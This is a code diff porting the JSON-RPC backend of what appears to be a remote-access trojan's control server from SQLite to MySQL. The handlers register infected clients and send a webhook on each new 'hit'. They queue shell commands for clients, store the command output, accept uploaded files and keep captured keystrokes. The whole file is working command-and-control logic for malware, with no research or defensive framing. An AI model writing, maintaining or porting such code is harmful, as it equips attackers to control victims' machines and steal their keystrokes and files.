@@ -1,103 +1,96 @@
 // language: JavaScript, file: tcp_rpc.js
-// JSON-RPC handlers used by /api/rpc. one object in → one object out.
-
 import { sendHitWebhook } from './webhook.js';
 import fs from 'node:fs';
 import path from 'node:path';
 import crypto from 'node:crypto';
 import db, { UPLOAD_DIR } from './db.js';
 
-const sql = (strings, ...vals) => {
-  if (vals.length) throw new Error('sql tagged template refused — use ? params');
-  return strings[0];
-};
-
 const MAX_UPLOAD = Number(process.env.MAX_UPLOAD_BYTES || 64 * 1024 * 1024);
 const MAX_RESULT = 32 * 1024 * 1024;
 const UPLOAD_KEEP = 2;
 
-function authKey(key) {
+async function authKey(key) {
   if (!key) return null;
-  return db.prepare(sql`SELECT id, username FROM users WHERE account_key = ?`).get(key);
+  const [rows] = await db.query(`SELECT id, username FROM users WHERE account_key = ?`, [key]);
+  return rows[0] || null;
 }
 
-function pruneUploads(clientId) {
-  const rows = db.prepare(sql`
+async function pruneUploads(clientId) {
+  const [rows] = await db.query(`
     SELECT id, stored_name FROM uploads
     WHERE client_id = ?
     ORDER BY created_at DESC
-  `).all(clientId);
+  `, [clientId]);
 
   for (let i = UPLOAD_KEEP; i < rows.length; i++) {
     const r = rows[i];
     try { fs.unlinkSync(path.join(UPLOAD_DIR, r.stored_name)); } catch {}
-    db.prepare(sql`DELETE FROM uploads WHERE id = ?`).run(r.id);
+    await db.query(`DELETE FROM uploads WHERE id = ?`, [r.id]);
   }
 }
 
-export function handleRpc(msg, remoteIp) {
+export async function handleRpc(msg, remoteIp) {
   const ip = String(remoteIp || '').replace(/^::ffff:/, '');
 
   if (!msg || typeof msg !== 'object') return { error: 'bad request' };
 
   const cmd = msg.cmd;
-  const user = authKey(msg.key);
+  const user = await authKey(msg.key);
   if (!user) return { error: 'invalid key' };
   const uid = user.id;
 
   switch (cmd) {
-        case 'register': {
+    case 'register': {
       const hostname = String(msg.hostname || 'unknown').slice(0, 64);
-      const existing = db.prepare(sql`
+      const [existingRows] = await db.query(`
         SELECT id FROM clients WHERE user_id = ? AND hostname = ?
-      `).get(uid, hostname);
+      `, [uid, hostname]);
 
-      if (existing) {
-        // Update existing client
-        db.prepare(sql`UPDATE clients SET ip = ?, last_seen = ? WHERE id = ?`)
-          .run(ip, Date.now(), existing.id);
+      if (existingRows.length > 0) {
+        const existing = existingRows[0];
+        await db.query(`UPDATE clients SET ip = ?, last_seen = ? WHERE id = ?`, [ip, Date.now(), existing.id]);
         return { ok: true, clientId: Number(existing.id) };
       }
 
-      // NEW CLIENT REGISTERED
-      const info = db.prepare(sql`
-        INSERT INTO clients (user_id, key, hostname, ip, last_seen)
+      const [info] = await db.query(`
+        INSERT INTO clients (user_id, \`key\`, hostname, ip, last_seen)
         VALUES (?, ?, ?, ?, ?)
-      `).run(uid, msg.key, hostname, ip, Date.now());
+      `, [uid, msg.key, hostname, ip, Date.now()]);
 
-      // Send the webhook!
       sendHitWebhook(uid, hostname, ip).catch(() => {});
 
-      return { ok: true, clientId: Number(info.lastInsertRowid) };
+      return { ok: true, clientId: Number(info.insertId) };
     }
 
     case 'pull': {
       const clientId = Number(msg.clientId || 0);
       let client = null;
       if (clientId) {
-        client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, uid);
+        const [rows] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [clientId, uid]);
+        client = rows[0];
       }
       if (!client) {
-        client = db.prepare(sql`
+        const [rows] = await db.query(`
           SELECT id FROM clients WHERE user_id = ? AND ip = ?
           ORDER BY last_seen DESC LIMIT 1
-        `).get(uid, ip);
+        `, [uid, ip]);
+        client = rows[0];
       }
 
       if (!client) return { id: null, clientId: null };
 
-      db.prepare(sql`UPDATE clients SET last_seen = ?, ip = ? WHERE id = ?`)
-        .run(Date.now(), ip, client.id);
+      await db.query(`UPDATE clients SET last_seen = ?, ip = ? WHERE id = ?`, [Date.now(), ip, client.id]);
 
-      const c = db.prepare(sql`
+      const [cmdRows] = await db.query(`
         SELECT id, shell, line FROM commands
         WHERE user_id = ? AND client_id = ? AND status = 'pending'
         ORDER BY created_at ASC LIMIT 1
-      `).get(uid, client.id);
+      `, [uid, client.id]);
 
-      if (!c) return { id: null, clientId: Number(client.id) };
+      if (cmdRows.length === 0) return { id: null, clientId: Number(client.id) };
+      const c = cmdRows[0];
 
-      db.prepare(sql`UPDATE commands SET status = 'sent' WHERE id = ?`).run(c.id);
+      await db.query(`UPDATE commands SET status = 'sent' WHERE id = ?`, [c.id]);
       return {
         id: Number(c.id),
         shell: c.shell,
@@ -108,11 +101,12 @@ export function handleRpc(msg, remoteIp) {
 
     case 'result': {
       if (!msg.id) return { error: 'missing id' };
-      const info = db.prepare(sql`
+      const [info] = await db.query(`
         UPDATE commands SET output = ?, status = 'done'
         WHERE id = ? AND user_id = ?
-      `).run(String(msg.output || '').slice(0, MAX_RESULT), msg.id, uid);
-      if (info.changes === 0) return { error: 'not found' };
+      `, [String(msg.output || '').slice(0, MAX_RESULT), msg.id, uid]);
+      
+      if (info.affectedRows === 0) return { error: 'not found' };
       return { ok: true };
     }
 
@@ -131,13 +125,15 @@ export function handleRpc(msg, remoteIp) {
 
       let client = null;
       if (clientId) {
-        client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, uid);
+        const [rows] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [clientId, uid]);
+        client = rows[0];
       }
       if (!client) {
-        client = db.prepare(sql`
+        const [rows] = await db.query(`
           SELECT id FROM clients WHERE user_id = ? AND ip = ?
           ORDER BY last_seen DESC LIMIT 1
-        `).get(uid, ip);
+        `, [uid, ip]);
+        client = rows[0];
       }
       if (!client) return { error: 'client not registered' };
 
@@ -146,14 +142,14 @@ export function handleRpc(msg, remoteIp) {
       try { fs.writeFileSync(dest, bytes, { mode: 0o600 }); }
       catch { return { error: 'write failed' }; }
 
-      const info = db.prepare(sql`
+      const [info] = await db.query(`
         INSERT INTO uploads (user_id, client_id, filename, stored_name, size, created_at)
         VALUES (?, ?, ?, ?, ?, ?)
-      `).run(uid, client.id, name, storedName, bytes.length, Date.now());
+      `, [uid, client.id, name, storedName, bytes.length, Date.now()]);
 
-      pruneUploads(client.id);
+      await pruneUploads(client.id);
 
-      return { ok: true, uploadId: Number(info.lastInsertRowid), filename: name, size: bytes.length };
+      return { ok: true, uploadId: Number(info.insertId), filename: name, size: bytes.length };
     }
 
     case 'keylog': {
@@ -163,26 +159,30 @@ export function handleRpc(msg, remoteIp) {
 
       let client = null;
       if (clientId) {
-        client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, uid);
+        const [rows] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [clientId, uid]);
+        client = rows[0];
       }
       if (!client) {
-        client = db.prepare(sql`
+        const [rows] = await db.query(`
           SELECT id FROM clients WHERE user_id = ? AND ip = ?
           ORDER BY last_seen DESC LIMIT 1
-        `).get(uid, ip);
+        `, [uid, ip]);
+        client = rows[0];
       }
       if (!client) return { error: 'client not registered' };
 
-      db.prepare(sql`
+      await db.query(`
         INSERT INTO keylogs (user_id, client_id, data, created_at)
         VALUES (?, ?, ?, ?)
-      `).run(uid, client.id, data, Date.now());
+      `, [uid, client.id, data, Date.now()]);
 
-      db.prepare(sql`
+      await db.query(`
         DELETE FROM keylogs WHERE client_id = ? AND id NOT IN (
-          SELECT id FROM keylogs WHERE client_id = ? ORDER BY id DESC LIMIT 2000
+          SELECT id FROM (
+            SELECT id FROM keylogs WHERE client_id = ? ORDER BY id DESC LIMIT 2000
+          ) AS tmp
         )
-      `).run(client.id, client.id);
+      `, [client.id, client.id]);
 
       return { ok: true, len: data.length };
     }
@@ -192,10 +192,10 @@ export function handleRpc(msg, remoteIp) {
   }
 }
 
-export function handleTcpLine(line, sock, remoteIp) {
+export async function handleTcpLine(line, sock, remoteIp) {
   let reply;
   try {
-    reply = handleRpc(JSON.parse(line), remoteIp);
+    reply = await handleRpc(JSON.parse(line), remoteIp);
   } catch {
     reply = { error: 'bad json' };
   }
